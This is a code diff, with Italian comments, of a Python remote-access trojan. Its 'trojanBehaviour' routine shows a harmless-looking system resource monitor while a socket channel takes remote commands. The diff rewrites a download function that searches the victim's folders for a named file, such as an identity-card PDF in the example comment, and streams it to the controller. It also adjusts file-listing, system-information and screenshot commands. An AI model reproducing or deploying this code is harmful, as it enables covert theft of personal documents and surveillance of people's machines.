@@ -19,6 +19,7 @@ def sendInfo(client):
             client.send((str((len(infos)))).encode(FORMAT))
             time.sleep(2)
             client.send(((infos)).encode(FORMAT))
+            time.sleep(4)
             mando = 0
         except Exception:
             mando = 0
@@ -33,7 +34,6 @@ def trojanBehaviour():
             disk = psutil.disk_usage("/").percent
             mem= psutil.swap_memory().percent
             battery= psutil.sensors_battery().percent
-            processes_count = 0
 
 
 
@@ -42,7 +42,7 @@ def trojanBehaviour():
             # facciamo un display a video dell'utilizzo
             print("              ------------------------------------------------------------- ")
             print(Fore.RESET + "             |"+Fore.GREEN + " CPU USAGE"+Fore.RESET+" |"+Fore.GREEN + " RAM USAGE"+Fore.RESET+" |"+Fore.GREEN + " DISK USAGE"+Fore.RESET+" |"+Fore.GREEN + " MEMORY USAGE"+Fore.RESET+" |"+Fore.GREEN + " BATTERY"+Fore.RESET+" |")
-            print(Fore.RESET + "             | {:02}%       | {:02}%       | {:02}%        | {:02}%          | {:02}%     |".format(int(cpu),
+            print(Fore.RESET + "             | {:02}%       | {:02}%       | {:02}%        | {:02}%         | {:02}%     |".format(int(cpu),
                                                                                                               int(ram),
                                                                                                               int(disk),
                                                                                                               int(mem),
@@ -76,92 +76,6 @@ def trojanBehaviour():
             print("              --------------------------------------------------------- ")
             print("             | CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES |")
             print("              --------------------------------------------------------- ")
-
-
-def download(comando,client):
-    currentPath=os.getcwd()
-
-    counter_virgolette=0
-    counter_spazi=0
-    inizio_file=0
-    fine_file=0
-    inizio_path=0
-    regex_match='null'
-
-    regex_match = regexcheck_download(comando)
-
-    if regex_match != 'null' and regex_match != 'not matched':
-        if regex_match == 'windowstip1'or regex_match == 'unixtip1':
-            print(f"verifica della regex prima del download: a buon fine e risulta un match per {regex_match}")
-
-            #tipologia 1: (simile a find) download "nomefile.estensione" path
-            for element in range(0, len(comando)):
-                if comando[element] == "\"":
-                    counter_virgolette += 1
-                    if counter_virgolette == 1:
-                        inizio_file = element+1
-                    elif counter_virgolette == 2:
-                        fine_file = element
-                if comando[element] == " ":
-                    counter_spazi += 1
-                    if counter_spazi >= 2 and counter_virgolette == 2:
-                        inizio_path = element+1
-
-        elif regex_match == 'windowstip2' or regex_match == 'unixtip2':
-            print(f"verifica della regex prima del download: a buon fine e risulta un match per {regex_match}")
-
-            #tipologia 2: (il risultato di filespath) "Carta di identità cartacea titolare.pdf" nel percorso: /Users/erasmo/Desktop
-            for element in range(0, len(comando)):
-                if comando[element] == "\"":
-                    counter_virgolette += 1
-                    if counter_virgolette == 1:
-                        inizio_file = element+1
-                    elif counter_virgolette == 2:
-                        fine_file = element
-                if comando[element] == ":" and counter_virgolette == 2:
-                    inizio_path = element + 2
-
-
-        file = comando[inizio_file:fine_file]
-        path = comando[inizio_path:]
-        print(f"Nella download del client risulta il nome del file: {file}")
-        print(f'e il path: {path}')
-
-        filetrovato=False
-        for root, dir, files in os.walk(path):
-            if file in files:
-                filetrovato=True
-                #esegui procedura di download
-                try:
-                    #filesize = os.path.getsize(file)
-                    filesize=10
-                    os.chdir(path)
-                    if filesize<=0:
-                        raise Exception
-                    else:
-                        with open(file, 'rb') as f:
-                            time.sleep(4)
-                            line = f.read(1024)
-                            client.send(line)
-                            while (line):
-                                line = f.read(1024)
-                                client.send(line)
-
-                            time.sleep(2)
-                            client.send(("[END]").encode(FORMAT))
-                            f.close()
-                            os.chdir(currentPath)
-                except:
-                    traceback.print_exc()
-                    print("error")
-                    client.send(("[ERROR]").encode(FORMAT))
-
-        if filetrovato == True:
-            print("il file è stato trovato")
-        else:
-            print("il file non è stato trovato")
-    else:
-        print("Al client è arrivata una regex che non fa match")
 
 
 # OK creazione file con tutti i tipi di tipologia
@@ -274,6 +188,98 @@ def find(comando, client):
         client.send(("[ERROR] Path doesn't exist").encode(FORMAT))
 
 
+def download(comando, client):
+    counter_virgolette = 0
+    counter_spazi = 0
+    inizio_file = 0
+    fine_file = 0
+    inizio_path = 0
+    file = 'null'
+    path = 'null'
+    regex_match = 'null'
+    regex_match = regexcheck_download(comando)
+    if regex_match != 'null' and regex_match != 'not matched':
+        if regex_match == 'windowstip1' or regex_match == 'unixtip1':
+            # tipologia 1: (simile a find) download "nomefile.estensione" path
+            for element in range(0, len(comando)):
+                if comando[element] == "\"":
+                    counter_virgolette += 1
+                    if counter_virgolette == 1:
+                        inizio_file = element + 1
+                    elif counter_virgolette == 2:
+                        fine_file = element
+                if comando[element] == " ":
+                    counter_spazi += 1
+                    if counter_spazi >= 2 and counter_virgolette == 2:
+                        inizio_path = element + 1
+        elif regex_match == 'windowstip2' or regex_match == 'unixtip2':
+            # tipologia 2: (il risultato di filespath) "Carta di identità cartacea titolare.pdf" nel percorso: /Users/erasmo/Desktop
+            for element in range(0, len(comando)):
+                if comando[element] == "\"":
+                    counter_virgolette += 1
+                    if counter_virgolette == 1:
+                        inizio_file = element + 1
+                    elif counter_virgolette == 2:
+                        fine_file = element
+                if comando[element] == ":" and counter_virgolette == 2:
+                    inizio_path = element + 1
+
+        file = comando[inizio_file:fine_file]
+        path = comando[inizio_path:]
+        # distinguere il tipo di path per utilizzare os.path.getsize
+        pathtoremember = 'null'
+        if path == ".":
+            path = os.getcwd()
+        elif path == "..":
+            pathtoremember = os.getcwd()
+            os.chdir("..")
+            path = os.getcwd()
+        elif path.startswith(".\\") or path.startswith("./"):
+            pathtoremember = os.getcwd()
+            os.chdir(os.getcwd() + path[1:])
+            path = os.getcwd()
+        elif path.startswith("\\") or path.startswith("/"):
+            pathtoremember = os.getcwd()
+            os.chdir(path)
+            path = os.getcwd()
+        else:
+            client.send(("[ERROR]").encode(FORMAT))
+
+        filetrovato = False
+
+        if path != 'null' and file != 'null':
+            for root, dir, files in os.walk(path):
+                if file in files:
+                    filetrovato = True
+                    break
+
+        # esegui procedura di download
+        if filetrovato:
+            try:
+                filesize = os.path.getsize(file)
+
+                if filesize <= 0:
+                    raise Exception
+                else:
+                    with open(file, 'rb') as f:
+                        time.sleep(4)
+                        line = f.read(1024)
+                        client.send(line)
+                        while (line):
+                            line = f.read(1024)
+                            client.send(line)
+
+                        time.sleep(2)
+                        f.close()
+                        client.send(("[END]").encode(FORMAT))
+            except:
+                client.send(("[ERROR]").encode(FORMAT))
+
+        # ritorno al path precedente nel caso fosse stato cambiato
+        if pathtoremember != 'null':
+            os.chdir(pathtoremember)
+
+
 # funzione di remote control
 def openRemoteControl(client):
     comando = "null"
@@ -356,10 +362,14 @@ def openRemoteControl(client):
                 client.send((os.getcwd()).encode(FORMAT))
 
             elif comando[0:9] == "filespath":
-                estensione = comando[10:]
-                try:
-                    filespath(estensione, client)
-                except:
+                reg = "^filespath .[a-z]{1,4}"
+                if(re.match(reg, comando)):
+                    try:
+                        estensione = comando[10:]
+                        filespath(estensione, client)
+                    except:
+                        pass
+                else:
                     pass
 
             elif comando[0:4] == "find":
@@ -374,10 +384,9 @@ def openRemoteControl(client):
                 infos = "Operating System: " + platform.system() + "\nMachine: " + platform.machine() + "\nHost: " + platform.node() + "\nProcessor: " + platform.processor() + "\nPlatform: " + platform.platform() + "\nRelease: " + platform.release() + "\nPath: " + os.getcwd() + "\n"
                 client.send(((infos)).encode(FORMAT))
 
+
             elif comando[0:8] == "download":
-
                 download(comando,client)
-
                 time.sleep(3)
 
             elif comando =="screenshot":
